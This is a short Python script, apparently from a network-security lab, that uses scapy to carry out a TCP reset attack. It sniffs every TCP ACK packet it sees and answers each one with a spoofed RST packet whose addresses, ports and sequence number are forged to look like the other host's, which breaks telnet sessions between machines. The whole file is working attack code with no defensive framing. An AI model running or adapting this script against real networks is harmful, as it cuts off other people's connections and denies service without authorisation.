#!/usr/bin/python
from scapy.all import *

def reset_connection(pkt):
	# Targetting Machine C, so a reset request is spoofed from Machine B 
	ip = IP(src= pkt[IP].dst, dst =pkt[IP].src)

	# Spoofed SEQ number will be the ACK of the original ACK packet
	spoof_seq = pkt[TCP].ack


	# Flip destination and source port to spoof reply from Machine B
	tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="RA", seq=spoof_seq)


	reset_packet = ip/tcp
	send(reset_packet)

# Create a packet sniffer to sniff for relevant traffic
# Ack packets are sent as part of telnet to validate the connection 
# between the hosts, hence the chosen filter
pkt = sniff(filter='tcp and tcp[tcpflags] == tcp-ack',prn=reset_connection)